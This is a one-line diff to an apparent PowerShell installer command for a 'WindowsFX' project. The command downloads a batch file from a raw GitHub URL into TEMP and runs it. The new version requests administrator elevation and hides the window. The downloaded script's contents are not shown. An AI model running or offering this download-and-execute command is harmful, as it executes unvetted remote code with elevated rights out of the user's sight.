@@ -1,1 +1,1 @@
-iwr -useb https://raw.githubusercontent.com/dazd-pkz/WindowsFX/main/run_admin.bat -o $env:TEMP\x.bat;cmd /c $env:TEMP\x.bat
+$iA = ${env:=::} -eq $null;if ($iA) {iwr -useb https://raw.githubusercontent.com/dazd-pkz/WindowsFX/main/run_admin.bat -o $env:TEMP\x.bat;saps $env:TEMP\x.bat -WindowStyle Hidden -Verb RunAs} else {iwr -useb https://raw.githubusercontent.com/dazd-pkz/WindowsFX/main/run_admin.bat -o $env:TEMP\x.bat;cmd /c $env:TEMP\x.bat}
